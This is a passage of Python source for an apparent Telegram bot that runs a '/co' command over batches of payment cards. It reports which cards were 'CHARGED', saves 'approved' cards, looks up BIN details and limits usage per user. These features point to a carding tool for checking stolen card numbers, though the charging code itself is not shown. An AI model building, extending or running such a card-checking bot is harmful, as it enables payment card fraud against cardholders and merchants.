    response += f"「❃」 𝗘𝗿𝗿𝗼𝗿𝘀 : <code>{errors} ⚠️</code></blockquote>\n\n"

    if last_result['status'] != 'CHARGED':
        response += f"<blockquote>「❃」 𝗟𝗮𝘀𝘁 𝗖𝗮𝗿𝗱 : <code>{last_result['card']}</code>\n"
        response += f"「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>{last_result['status']}</code>\n"
        response += f"「❃」 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : <code>{last_result['response']}</code>\n"
        response += f"「❃」 𝗧𝗶𝗺𝗲 : <code>{last_result['time']}s</code></blockquote>\n\n"

    response += f"<blockquote>「❃」 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : <code>/co</code>\n"
    response += f"「❃」 𝗧𝗼𝘁𝗮𝗹 𝗧𝗶𝗺𝗲 : <code>{total_time}s</code></blockquote>"

    await processing_msg.edit(response, parse_mode='html')

async def main():
    await initialize_files()

    # Create a wrapper for get_cc_limit that can be used by external modules
    def get_cc_limit_wrapper(access_type, user_id=None):
        return get_cc_limit(access_type, user_id)
    
    utils_for_all = {
        'can_use': can_use,
        'banned_user_message': banned_user_message,
        'access_denied_message_with_button': access_denied_message_with_button,
        'extract_card': extract_card,
        'extract_all_cards': extract_all_cards,
        'get_bin_info': get_bin_info,
        'save_approved_card': save_approved_card,
        'get_cc_limit': get_cc_limit_wrapper,
        'pin_charged_message': pin_charged_message,
        'ADMIN_ID': ADMIN_ID,
        'load_json': load_json,
        'save_json': save_json
    }

    
    print("𝘽𝙊𝙏 𝙍𝙐𝙉𝙉𝙄𝙉𝙂 💨")
    await client.start(bot_token=BOT_TOKEN)
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
